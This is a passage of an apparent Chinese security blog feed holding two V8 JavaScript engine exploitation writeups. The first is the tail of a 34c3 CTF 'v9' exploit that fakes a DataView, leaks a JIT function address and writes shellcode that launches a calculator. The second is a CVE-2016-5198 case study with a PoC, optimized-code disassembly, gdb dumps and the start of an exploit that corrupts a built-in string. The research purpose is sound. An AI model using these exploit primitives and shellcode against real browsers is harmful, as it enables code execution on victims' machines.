长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="comment">// read function code address</span></span><br><span class="line">fake_ab[<span class="number">4</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">fake_ab[<span class="number">5</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"></span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;34c3-v9-writeup&quot;&gt;&lt;a href=&quot;#34c3-v9-writeup&quot; class=&quot;headerlink&quot; title=&quot;34c3 v9 writeup&quot;&gt;&lt;/a&gt;34c3 v9 writeup&lt;/h1&gt;&lt;p&gt;很久之前做的了，和*CTF那题差不多
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>case study:cve-2016-5198</title>
    <link href="http://eternalsakura13.com/2019/04/29/CVE-2016-5198/"/>
    <id>http://eternalsakura13.com/2019/04/29/CVE-2016-5198/</id>
    <published>2019-04-29T05:34:45.220Z</published>
    <updated>2019-04-29T05:35:16.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="case-study-cve-2016-5198"><a href="#case-study-cve-2016-5198" class="headerlink" title="case study:cve-2016-5198"></a>case study:cve-2016-5198</h1><h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a><br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">0x826852f4</span>;</span><br><span class="line">    <span class="built_in">parseInt</span>(<span class="string">'AAAAAAAA'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor();</span><br><span class="line">Check();</span><br><span class="line">print(<span class="string">"finish"</span>);</span><br></pre></td></tr></table></figure><h2 id="漏洞表现"><a href="#漏洞表现" class="headerlink" title="漏洞表现"></a>漏洞表现</h2><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><h4 id="优化前"><a href="#优化前" class="headerlink" title="优化前"></a>优化前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz = 0x826852f4;</span><br><span class="line">parseInt(&apos;AAAAAAAA&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--- Code ---</span><br><span class="line">0x35680eb86a00     0  55             push rbp</span><br><span class="line">0x35680eb86a01     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86a04     4  56             push rsi</span><br><span class="line">0x35680eb86a05     5  57             push rdi</span><br><span class="line">0x35680eb86a06     6  488b4f2f       REX.W movq rcx,[rdi+0x2f]</span><br><span class="line">0x35680eb86a0a    10  488b490f       REX.W movq rcx,[rcx+0xf]</span><br><span class="line">0x35680eb86a0e    14  83411b01       addl [rcx+0x1b],0x1</span><br><span class="line">0x35680eb86a12    18  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86a19    25  7305           jnc 32  (0x35680eb86a20)</span><br><span class="line">0x35680eb86a1b    27  e8c0bef5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86a20    32  48b80000000002000000 REX.W movq rax,0x200000000</span><br><span class="line">0x35680eb86a2a    42  e8b1d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a2f    47  50             push rax</span><br><span class="line">0x35680eb86a30    48  48b8e9c362be00370000 REX.W movq rax,0x3700be62c3e9    ;; object: 0x3700be62c3e9 &lt;Number: 2.18788e+09&gt;</span><br><span class="line">0x35680eb86a3a    58  5a             pop rdx</span><br><span class="line">0x35680eb86a3b    59  48b919b062be00370000 REX.W movq rcx,0x3700be62b019    ;; object: 0x3700be62b019 &lt;String[3]: xyz&gt;</span><br><span class="line">0x35680eb86a45    69  48bf0000000004000000 REX.W movq rdi,0x400000000</span><br><span class="line">0x35680eb86a4f    79  e80cb8f0ff     call 0x35680ea92260     ;; code: STORE_IC</span><br><span class="line">0x35680eb86a54    84  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a58    88  48b80000000008000000 REX.W movq rax,0x800000000</span><br><span class="line">0x35680eb86a62    98  e879d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a67   103  50             push rax</span><br><span class="line">0x35680eb86a68   104  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86a72   114  4152           push r10</span><br><span class="line">0x35680eb86a74   116  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86a7e   126  4152           push r10</span><br><span class="line">0x35680eb86a80   128  48ba0000000006000000 REX.W movq rdx,0x600000000</span><br><span class="line">0x35680eb86a8a   138  488b7c2410     REX.W movq rdi,[rsp+0x10]</span><br><span class="line">0x35680eb86a8f   143  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86a94   148  e8a7ddffff     call 0x35680eb84840     ;; code: CALL_IC</span><br><span class="line">0x35680eb86a99   153  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a9d   157  4883c408       REX.W addq rsp,0x8</span><br><span class="line">0x35680eb86aa1   161  498b45a0       REX.W movq rax,[r13-0x60]</span><br><span class="line">0x35680eb86aa5   165  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86aaf   175  83430bd1       addl [rbx+0xb],0xd1</span><br><span class="line">0x35680eb86ab3   179  791f           jns 212  (0x35680eb86ad4)</span><br><span class="line">0x35680eb86ab5   181  50             push rax</span><br><span class="line">0x35680eb86ab6   182  e8a5bdf5ff     call InterruptCheck  (0x35680eae2860)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86abb   187  58             pop rax</span><br><span class="line">0x35680eb86abc   188  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86ac6   198  49ba0000000000180000 REX.W movq r10,0x180000000000</span><br><span class="line">0x35680eb86ad0   208  4c895307       REX.W movq [rbx+0x7],r10</span><br><span class="line">0x35680eb86ad4   212  c9             leavel</span><br><span class="line">0x35680eb86ad5   213  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h4 id="优化后"><a href="#优化后" class="headerlink" title="优化后"></a>优化后</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz = 0x826852f4;</span><br><span class="line">parseInt(&apos;AAAAAAAA&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Optimized code ---</span><br><span class="line">optimization_id = 1</span><br><span class="line">source_position = 50</span><br><span class="line">kind = OPTIMIZED_FUNCTION</span><br><span class="line">name = Check</span><br><span class="line">stack_slots = 5</span><br><span class="line">compiler = crankshaft</span><br><span class="line">Instructions (size = 186)</span><br><span class="line">0x35680eb86c80     0  55             push rbp</span><br><span class="line">0x35680eb86c81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86c84     4  56             push rsi</span><br><span class="line">0x35680eb86c85     5  57             push rdi</span><br><span class="line">0x35680eb86c86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x35680eb86c8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x35680eb86c8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x35680eb86c92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x35680eb86c95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86c9c    28  7305           jnc 35  (0x35680eb86ca3)</span><br><span class="line">0x35680eb86c9e    30  e83dbcf5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86ca3    35  48b8c1bd62be00370000 REX.W movq rax,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b675545e1 &lt;a Set with map 0xae15ff0c391&gt;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x288d1c42b999: [PropertyCell]</span><br><span class="line"> - value: 0x28212078a219 &lt;a Set with map 0x1fdb7e106509&gt;</span><br><span class="line"> - details: (data, dictionary_index: 138, attrs: [WE_])</span><br><span class="line"> - cell_type: ConstantType (StableMap)</span><br><span class="line">...</span><br><span class="line">0x35680eb86cad    45  488b400f       REX.W movq rax,[rax+0xf] //取出JSSet n</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x28212078a219: [JSSet]</span><br><span class="line"> - map = 0x1fdb7e106509 [FastProperties]</span><br><span class="line"> - prototype = 0x288d1c415e49</span><br><span class="line"> - elements = 0x2089c5182241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS] - table = 0x28212078a239 &lt;FixedArray[13]&gt;</span><br><span class="line"> - properties = &#123;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br><span class="line">0x35680eb86cb1    49  49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000</span><br><span class="line">0x35680eb86cbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">...</span><br><span class="line">0x41e04d0a5e800000 --d2ull-&gt; 0x00000000826852f4</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc0    64  488b4007       REX.W movq rax,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">...</span><br><span class="line">0x0000393bb3086cc4 in ?? ()</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x2089c5182241: [FixedArray]</span><br><span class="line"> - length: 0</span><br><span class="line">gdb-peda$ x/20gx 0x28212078a219-1</span><br><span class="line">0x28212078a218:0x00001fdb7e1065090x00002089c5182241</span><br><span class="line">0x28212078a228:0x00002089c5182241</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc4    68  488b400f       REX.W movq rax,[rax+0xf] // 取n的xyz域</span><br><span class="line">// 因为当JSSet对象n进行初始化时，由于尚没有其他的自定义属性存在，因此该位置将使用内置对象empty_fixed_array进行初始化。</span><br><span class="line">// 让我们看一下empty_fixed_array</span><br><span class="line">0x2089c5182240:0x000007f3e4882309-&gt;FIXED_ARRAY_TYPE Map0x0000000000000000</span><br><span class="line">0x2089c5182250:0x000007f3e4882361-&gt;initial_string map0x00000000803b1506</span><br><span class="line">0x2089c5182260:0x00000004000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x7f3e4882361: [Map]</span><br><span class="line"> - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2089c5182311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x2089c5182231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc8    72  c5fb114007     vmovsd [rax+0x7],xmm0 //重新赋值，破坏了initial_string map的结构，于是在后面ParseInt字符串的时候会crash</span><br><span class="line">...</span><br><span class="line">对比一下赋值前后</span><br><span class="line">前:</span><br><span class="line">gdb-peda$ x/20gx 0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x0019000400007300</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">后:</span><br><span class="line">gdb-peda$ x/20gx 0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x41e04d0a5e800000--&gt;破坏了map结构</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">...</span><br><span class="line">0x35680eb86ccd    77  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86cd7    87  4152           push r10</span><br><span class="line">0x35680eb86cd9    89  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86ce3    99  4152           push r10</span><br><span class="line">0x35680eb86ce5   101  48bf51d860be00370000 REX.W movq rdi,0x3700be60d851    ;; object: 0x3700be60d851 &lt;JS Function parseInt (SharedFunctionInfo 0xf6ab33ce11)&gt;</span><br><span class="line">0x35680eb86cef   111  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="line">0x35680eb86cf3   115  488b7727       REX.W movq rsi,[rdi+0x27]</span><br><span class="line">0x35680eb86cf7   119  498b55a0       REX.W movq rdx,[r13-0x60]</span><br><span class="line">0x35680eb86cfb   123  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86d00   128  bb02000000     movl rbx,0x2</span><br><span class="line">0x35680eb86d05   133  e8f6eeefff     call ArgumentsAdaptorTrampoline  (0x35680ea85c00)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86d0a   138  48b8112330abf6000000 REX.W movq rax,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86d14   148  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x35680eb86d17   151  5d             pop rbp</span><br><span class="line">0x35680eb86d18   152  c20800         ret 0x8</span><br><span class="line">0x35680eb86d1b   155  90             nop</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>据此，我们可以得出结论，在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919133141e-308</span>;    <span class="comment">// do not modify string map </span></span><br><span class="line">    n.xyz1 = <span class="number">0x1821923f</span>                 <span class="comment">// do not modify hash value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>         <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x1c4269306d80     0  55             push rbp</span><br><span class="line">0x1c4269306d81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x1c4269306d84     4  56             push rsi</span><br><span class="line">0x1c4269306d85     5  57             push rdi</span><br><span class="line">0x1c4269306d86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x1c4269306d8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x1c4269306d8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x1c4269306d92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x1c4269306d95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x1c4269306d9c    28  7305           jnc 35  (0x1c4269306da3)</span><br><span class="line">0x1c4269306d9e    30  e83dbbf5ff     call StackCheck  (0x1c42692628e0)    ;; code: BUILTIN</span><br><span class="line">0x1c4269306da3    35  48b8d9b9fadec60a0000 REX.W movq rax,0xac6defab9d9    ;; object: 0xac6defab9d9 PropertyCell for 0x3b0974d0a4b9 &lt;a Set with map 0x30613ee86509&gt;</span><br><span class="line">0x1c4269306dad    45  488b400f       REX.W movq rax,[rax+0xf] //取出JSSet n</span><br><span class="line">0x1c4269306db1    49  49ba0064000004001900 REX.W movq r10,0x19000400006400</span><br><span class="line">0x1c4269306dbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">0x1c4269306dc0    64  488b5807       REX.W movq rbx,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">0x1c4269306dc4    68  488b5b0f       REX.W movq rbx,[rbx+0xf] // 取n的xyz域，注意取域的时候，如果这个域代表的意义是一个整数值，就直接写入，如果代表的是一个指针，就要从指针再寻址写入。</span><br><span class="line">0x1c4269306dc8    72  c5fb114307     vmovsd [rbx+0x7],xmm0</span><br><span class="line">0x1c4269306dcd    77  488b5807       REX.W movq rbx,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">0x1c4269306dd1    81  c7431b3f922118 movl [rbx+0x1b],0x1821923f // 取n的xyz1域，注意这里要用一个整形数去完整替换，不然会变成一个HeapNum指针，而这个指针是可能访问到不能访问的内存，从而crash</span><br><span class="line">0x1c4269306dd8    88  488b4007       REX.W movq rax,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">0x1c4269306ddc    92  c7402300700000 movl [rax+0x23],0x7000 // 取n的xyz1域</span><br><span class="line">...</span><br><span class="line">最终</span><br><span class="line">gdb-peda$ x/20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">0x1c4269306de3    99  48b8112380ec67300000 REX.W movq rax,0x3067ec802311    ;; object: 0x3067ec802311 &lt;undefined&gt;</span><br><span class="line">0x1c4269306ded   109  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x1c4269306df0   112  5d             pop rbp</span><br><span class="line">0x1c4269306df1   113  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x2b753502250:0x00003182a4182361-&gt;null0x00000000803b1506</span><br><span class="line">0x2b753502260:0x00000004-&gt;length 000000000xdeadbeed 6c6c756e-&gt;&quot;null&quot;</span><br><span class="line">0x2b753502270:0x00003182a4182361-&gt;object0x00000000c5f6c42a</span><br><span class="line">0x2b753502280:0x0000000600000000-&gt;length0xdead 7463656a626f-&gt;&quot;object&quot;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job 0x2b753502251</span><br><span class="line">#null</span><br><span class="line">gdb-peda$ job 0x2b753502271</span><br><span class="line">#object</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-12-092410.jpg" alt=""></p><h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><ul><li><p>表示JavaScript function的对象</p><ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img 